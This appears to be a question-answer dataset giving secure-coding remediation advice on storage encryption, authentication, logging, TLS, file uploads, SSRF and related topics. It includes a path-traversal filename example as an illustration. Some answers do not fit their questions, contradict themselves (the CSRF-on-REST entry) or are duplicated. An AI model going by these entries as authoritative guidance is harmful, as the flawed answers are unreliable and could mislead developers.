How to resolve Enforce sensitive information to be stored encrypted on device??,"Sensitive information should always be stored encrypted and preferably on the server side and retrieved using an object reference with proper authorization mechanisms in place. Do not implement an existing cryptographic algorithm on your own, no matter how easy it appears. Instead, use widely accepted algorithms and widely accepted implementations.The cardinal rule of mobile apps is to not store data unless absolutely necessary. As a developer you have to assume that the data is forfeited as soon as it touches the phone. You also have to consider the implications of losing mobile users' data to a silent jailbreak or root exploit."
How to resolve Encrypt sensitive information different depending on context?,"Determine the context of where the sensitive information is being stored, is it a small data set or is the data stored in a SQLite database. For every context determine the applications platform recommended native options settings and follow these recommendations accordingly."
How to resolve Secrets should be secure random generated?,"When it comes to API tokens and secret keys these values have to be dynamically generated and should be cryptographically random secure with at least 120 bit of effective entropy.Passwords on the other hand should be created by the user himself, rather than assigning a user a dynamically generated password. The user should be presented a link with a cryptographically random token by means of an email or SMS which is used to activate his account and provide a password of his own."
How to resolve Protection against different exfiltration techniques?,"Disallow screenshots of the application whenever the application is backgrounded Do not write sensitive information in the applications console, this information is accessible by attackers. Create a custom window for whenever the application is shown in the ActivityManager, so it does not give away sensitive information."
How to resolve Principle of least privilege?,Verify that the application is requesting minimal permissions for required functionality and resources.
How to resolve Protecting device memory?,A very good and known and proven technology that can be used is ASLR (Address Space Layout Randomisation). It does this by randomly offsetting the location of modules and certain inmemory structures that will make the developing of exploits much harder.
How to resolve Enforce anti debugging techniques?,The application has to make use of antidebugging techniques that are sufficient enough to deter or delay likely attackers from injecting debuggers into the application. Also the application has to be able to notice if it's runned on an emulator or a specially designed hardware device that was not intended to be used and to prevent the attacker from gaining knowledge about the application.
How to resolve Protect sensitive activities intents or content providers?,"Identify throughout the application if there are any sensitive activities, intents or content providers that are being exported."
How to resolve Mitigate memory dumping attacks?,"Sensitive information maintained in memory must be overwritten with zeros as soon as it no longer actively used, to mitigate memory dumping attacks.Note: Whenever the programming language has a garbage collector make sure whenever values are zeroed the GC is also emptied."
How to resolve Protect agains exported activities or content providers?,"Input from exported activities, intents or content providers should be validated against the applications intended operation, i.e if the application expects a field with an integer value, all other incoming data that work out of this intended operation should be logged and rejected by the application."
How to resolve Block common password and weak passphrases?,"Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered."
How to resolve Application assets hosted on secure location?,"Verify that all application assets are hosted by the application, such as JavaScript libraries, CSS stylesheets and web fonts are hosted by the application rather than rely on a CDN or external provider."
How to resolve CSRF on REST?,"REST (REpresentational State Transfer) is a simple stateless architecture that generally runs over HTTPS/TLS. The REST style emphasizes that interactions between clients and services are enhanced by having a limited number of operationsSince the architecture is stateless, the application should make use of sessions or cookies to store the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST services is to utilize tokens for interactive information interchange between the user and the server. By sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks since the CSRF attack utilizes the browsers cookie jar for succesful attacks."
How to resolve File IO commands?,File names and file contents should be sanitized before being used in I/O commands.
How to resolve File upload anti virus check?,"After uploading the file, the file should be placed in quarantine and antivirus has to inspect the file for malicious viruses. Antivirus software that has a commandline interface is requisite for doing such scans. There are also API's available for other services such as from ""VirusTotal.com"" This site provides a free service in which your file is given as input to numerous antivirus products and you receive back a detailed report with the evidence resulting from the scanning process"
How to resolve File upload outside document root?,"Files should be stored outside of the applications document root. Preferably files should be stored on a seperate file server which serves back and forth to the application server. Files should always be stored outside of the scope of the attacker to prevent files from being parsed or executed.When storing files outside of the document root, take into consideration potential path traversal injections in the applications file name such as ""../html/backtoroot/file.php"". Whenever this filename is being used directly into the path that is used to store files, it could be used to manipulate the storage path."
How to resolve Unauthorized and unauthenticated access security logs?,The security logs could be protected by means of (HIDS). This is a system that monitors important operating system files to make sure the files can only be accessed by particular users. Security log files could also be protected by the OS itself by defining groups and users and grant only a particular set of users access to the files.
How to resolve Commonly chosen weak passwords and passphrases?,The internet is full of top X worst password lists which can be used to verify the users freshly entered password against. Whenever a user enters a password that matches up to a password provided in one of those lists. The password should be rejected and the user should be advised to take another password.
How to resolve Two factor authentication against username password disclosure?,"Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)Examples of two/multi factor authentication can be 1. Google authenticator Google Authenticator is an application that implements twostep verification services using the Timebased Onetime Password Algorithm (TOTP) and HMACbased Onetime Password Algorithm 2. Yubikey The YubiKey is a hardware authentication device manufactured by Yubico that supports onetime passwords, public key encryption and authentication, and the Universal 2nd Factor (U2F) protocol[1] developed by the FIDO Alliance (FIDO U2F). It allows users to securely log into their accounts by emitting onetime passwords or using a FIDObased public/private key pair generated by the device"
How to resolve Logging access control decisions?,Verify that all access control decisions can be logged and all failed decisions are logged.
How to resolve High value transactions?,"1 risk based authentication: In Authentication, riskbased authentication is a nonstatic authentication system which takes into account the profile of the agent requesting access to the system to determine the risk profile associated with that transaction. The risk profile is then used to determine the complexity of the challenge. Higher risk profiles leads to stronger challenges, whereas a static username/password may suffice for lowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional credentials only when the risk level is appropriate.2 two factor authentication: Multifactor authentication (MFA) is a method of computer access control in which a user is granted access only after successfully presenting several separate pieces of evidence to an authentication mechanism – typically at least two of the following categories: knowledge (something they know), possession (something they have), and inherence (something they are)3 Transaction signing: Transaction signing (or digital transaction signing) is the process of calculating a keyed hash function to generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.A keyed hash is a function of the user's private or secret key and the transaction details, such as the transfer to the account number and the transfer amount.To provide a high level of assurance of the authenticity and integrity of the hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader. Calculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be counterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself."
How to resolve Verify that structured data is strongly typed and validated?,"Verify that structured data is strongly typed and validated against a defined schema including allowed characters, length and pattern (e.g. credit card numbers or telephone, or validating that two related fields are reasonable, such as validating suburbs and zip or post codes match"
How to resolve Logging guidelines to access sensitive information?,"Verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required."
How to resolve Log injection?,"You should consider these three controls when implementing logging systems. Design: If at all possible, avoid logging data that came from external inputs. Implementation: Ensure that all log entries are statically created, or if they must record external data that the input is vigorously whitelist checked. Run time: Avoid viewing logs with tools that may interpret control characters in the file, such as commandline shells.Also verify that all nonprintable symbols and field separators are properly encoded in log entries, to prevent log injection."
How to resolve Validate the integrity of all security relevant configurations?,Verify that authorised administrators have the capability to verify the integrity of all securityrelevant configurations to ensure that they have not been tampered with.One way to achieve this would be to apply (HIDS) rules. This is a system that monitors important operating system files and can verify whether these files have been edited. Whenever these files are edited a four eyes principle must be applied that checks the integrity of these changes.
How to resolve Trusted repositories?,"When checking if a repository can be trusted look to see if the source is stil maintained, security bugs are being reported and mitigated, if the component is not at the end of life or deprecated.You can also scan the component in your SDLC through OWASP dependency checker to see if there are any known CVEs for this component."
How to resolve Sandboxing malicious code?,"Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an iframe enables restrictions on content within an iframe. The following restrictions are Active when the sandbox attribute is set: All markup is treated as being from a unique origin All forms and scripts are disabled. All links are prevented from targeting other browsing contexts All features that trigger automatically are blocked All plugins are disabled It is possible to have a finegrained control over iframe capabilities using the value of the sandbox attribute. In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported. Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header XFrameOptions which supports the deny and sameorigin values. Other solutions like framebusting: ```JavaScript if(window!== window.top) { window.top.location = location; } Only for legacy browser support ```"
How to resolve Client side constraints?,All critical decision making logic must be enforced on the server side out of the scope of a potential attacker. Client side constraints can be easily bypassed.
How to resolve Context sensitive authorization?,"Authorization grants must be granted and enforced outside of the attackers scope. i.e: The user logs into the application, the user id is then stored in a local variable. The application stores grants(privileges/attributes/claims) in the database and for each function the user calls the application gets the grants from the DB using the local variable and checks if the user has access to this function."
How to resolve All access controls must fail securely?,Make sure all the access control systems are thoroughly tested for failing securely before using it in your application. It is common that complete unittest are created especially for this purpose.
How to resolve Password leakage?,"The application should under no circumstances disclose the users current, old and new password plain text. This behavior makes the application susceptible to side channel attacks and make the passwords lose their integrity since they could be compromised by someone looking over another users shoulder to see the password."
How to resolve TLS implementation?,"Verify that TLS is used for all connections (including both external and backend connections) that are authenticated or that involve sensitive data or functions, and does not fall back to insecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.As modern cryptography relies on being computationally expensive to break, specific standards can be set for key sizes that will provide assurance that with today’s technology and understanding, it will take too long to decrypt a message by attempting all possible keys.Therefore, we need to ensure that both the algorithm and the key size are taken into account when selecting an algorithm. Whenever computer power increases the standards for selecting a new alogrithm changes as well."
How to resolve Screen scraping data harvest?,ModSecurity can be used to set up rules to prevent attackers from scraping and harvesting data from the application. The ModSecurity can be set up with thresholds and rate limiting and block IP adresses if they exceed the threshold.
How to resolve Communication between components (low privileges)?,"Communications between components, such as between the application server and the database server should be authenticated using an account with the least necessary privileges."
How to resolve TLS settings are in line with current leading practice?,"There should be structural scans that are done regularly against the applications TLS settings and configurations to check whether the TLS settings are in line with current leading practice.This could be achieved by using the SSLLabs api or the OWASP OSaft project.OSaft is an easy to use tool to show informations about SSL certificate and tests the SSL connection according to a given list of ciphers and various SSL configurations.It's designed to be used by penetration testers, security auditors or server administrators. The idea is to show the important information or the special checks with a simple call of the tool. However, it provides a wide range of options so that it can be used for comprehensive and special checks by experienced people."
How to resolve Data retention policy?,All the sensitive information within the application must be mapped along with the timeframe it is necessary to store this data on the application. For each data set it must be determined how to effectively clear this information from the application.
How to resolve Authenticated data cleared from client storage?,Whenever the user terminates his session all sensitive authenticated information should be cleared from the browser in the client storage. such as:* local storage * Session storage * web SQL * Cache storage * Application cache * etc
How to resolve File inclusion attack II?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible, the application can maintain a white list of files that may be included on the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path.Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml."
How to resolve Sensitive information in code or online repositories?,"Verify that secrets, API keys, and passwords are not included in the source code, or online source code repositories.This could be achieved by manual code reviews and potentially small tools that checks the code for these keys and secrets by means of pattern matching."
How to resolve Identify all components?,Verify that all application components are defined in terms of the business functions and/or security functions they provide.
How to resolve Display concurrent and active sessions?,"The user should be presented with all concurrent and active sessions in his profile/account summary. This way the user can keep track of what is happening and can choose to terminate a session whenever it feels untrusted. Whenever the user shared permission to other applications by means of for example OAuth, than the user should also be presented that have shared permissions along with the type of permissions and activation date."
How to resolve Password change leads to destroying concurrent sessions?,Verify the user is prompted with the option to terminate all other active sessions after a successful change password process.
How to resolve HSTS preload?,"In order to request for HSTS preloading, there are some requirements the application has to be complient with. The submission for the HSTS preloading can be performed on the following url: https://hstspreload.org/Submission RequirementsIf a site sends the preload directive in an HSTS header, it is considered to be requesting inclusion in the preload list and may be submitted via the form on this site.In order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:1. Serve a valid certificate. 2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80. 3. Serve all subdomains over HTTPS. In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists. 5. Serve an HSTS header on the base domain for HTTPS requests: The maxage must be at least eighteen weeks (10886400 seconds). The includeSubDomains directive must be specified. The preload directive must be specified. If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS header (rather than the page it redirects to).Now the following parameter can be added to the HSTS header,maintained by Chrome (and used by Firefox and Safari), then use: StrictTransportSecurity: maxage=31536000; includeSubDomains; preloadThe 'preload' flag indicates the site owner's consent to have their domain preloaded. The site owner still needs to then go and submit the domain to the list. CAUTION:Make sure to have a perfectly smooth certification management. Whenever there is no valid certificate, the application can not be downgraded temporarily over HTTP. The failing of the TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP"
How to resolve Integrity check and authorised modification?,Verify all access controls are implemented properly in order to prevent a user access data/functions which he was not intended to use.
How to resolve Unauthorised access and modification?,Verify all access controls are implemented properly in order to prevent a user access data/functions which he was not intended to use.
How to resolve Identify and use only require functions if using components?,The best approach in minimizing the possible security issues that can arise in application components and identify the required functions and disable or remove those that are not needed by the application business functions or security functions. This way there is a lower risk when using those components and easier to maintain and protecting the application.
How to resolve Centralized the mechanisms for protecting resources and the access?,Immplement a centralized mechanism where all the different types of resources and grating access to these resources (including libraries that call external authorization services) are located. This way it's easier to maintain and the lower the complexity.
How to resolve Third party components?,"Verify that all components that are not part of the application but that the application relies on to operate are defined in terms of the functions, and/or security functions, they provide."
How to resolve Policy for processing sensitive data?,"Identify the list of sensitive data that is being processed by the application.Establish, maintain, and disseminate a security policy for processing and storing sensitive data. If information should be encrypted, separated in another database, etc. If exist, follow the appropriate standard."
How to resolve Server side request forgery?,"Disable unused URL schemas which are dangerous like expect://, file:///, ftp://, gopher://. Proper whitelisting of domain or IP address which you need to access to. Response received from the internal server should not be shown to the attacker. Some services like Memcached, Redis, Elasticsearch and MongoDB do not require authentication by default, so we need to enable authentication for these services."
